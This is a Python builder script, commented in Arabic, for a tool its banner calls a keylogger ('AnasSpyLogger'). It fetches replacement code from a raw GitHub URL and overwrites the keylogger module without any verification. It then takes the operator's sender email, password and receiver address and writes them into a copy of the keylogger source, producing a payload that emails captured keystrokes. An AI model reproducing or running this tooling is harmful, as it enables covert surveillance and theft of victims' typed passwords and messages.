import os
import requests
from tool import anasspylogger

# رابط التحديث المباشر للسكريبت
update_url = "https://raw.githubusercontent.com/anaslabrini/AnasSpyLogger/refs/heads/main/tool/anasspylogger.py"
target_file = "tool/anasspylogger.py"  # الملف المستهدف للتحديث

def clear_screen():
    if os.name == "posix":
        os.system("clear")
    elif os.name == "nt":
        os.system("cls")

clear_screen()

print("[*] Checking for updates...")

try:
    response = requests.get(update_url, timeout=10)
    if response.status_code == 200:
        # كتابة المحتوى الجديد في نفس الملف دون تغيير اسمه
        with open(target_file, 'w') as f:
            f.write(response.text)
        print("[+] Script content updated successfully.")
    else:
        print(f"[-] Failed to download update. Status Code: {response.status_code}")

except requests.exceptions.RequestException as e:
    print(f"[-] Update error: {e}")




# بعد تشغيل anasspylogger.py، نعرض الـ Banner
print("""\033[94m

     █████╗         ███████╗        ██╗     
    ██╔══██╗        ██╔════╝        ██║     
    ███████║        ███████╗        ██║     
    ██╔══██║        ╚════██║        ██║     
    ██║  ██║        ███████║        ███████╗
    ╚═╝  ╚═╝        ╚══════╝        ╚══════╝
                      ▜           
        ▀▌▛▌▀▌▛▘▛▘▛▌▌▌▐ ▛▌▛▌▛▌█▌▛▘
        █▌▌▌█▌▄▌▄▌▙▌▙▌▐▖▙▌▙▌▙▌▙▖▌ 
                  ▌ ▄▌    ▄▌▄▌    
                                        
                 \033[0m
\033[94m      KeyLogger Tool by Anas Labrini - v1.0 
\033[0m
""")

# استلام المدخلات من المستخدم
try:
    input_email = input("Enter the email address: ")
    input_password = input("Enter the email password: ")
    input_receiver = input("Enter the receiver email: ")
    output_filename = input("Enter the output filename (without .py extension): ") + ".py"

    # التحقق من صحة المدخلات
    if not ("@" in input_email and "." in input_email):
        raise ValueError("[-] Invalid email address.")
    if not input_password:
        raise ValueError("[-] Password cannot be empty.")
    if not ("@" in input_receiver and "." in input_receiver):
        raise ValueError("[-] Invalid receiver email.")

    # الملف الرئيسي للسكربت
    input_file = "tool/anasspylogger.py"

    # فتح الملف وقراءة المحتوى
    with open(input_file, "r") as file:
        content = file.read()

    # تعديل القيم
    content = content.replace('EMAIL_ADDRESS = "default_email"', f'EMAIL_ADDRESS = "{input_email}"')
    content = content.replace('EMAIL_PASSWORD = "default_password"', f'EMAIL_PASSWORD = "{input_password}"')
    content = content.replace('TO_EMAIL = "default_receiver"', f'TO_EMAIL = "{input_receiver}"')

    # حفظ النسخة المعدلة
    with open(output_filename, "w") as output_file:
        output_file.write(content)

    print(f"[+] The modified file has been saved as {output_filename}")

except FileNotFoundError:
    print("[-] The specified file was not found.")
except ValueError as ve:
    print(f"[-] Error: {ve}")
except Exception as e:
    print(f"[-] An unexpected error occurred: {e}")
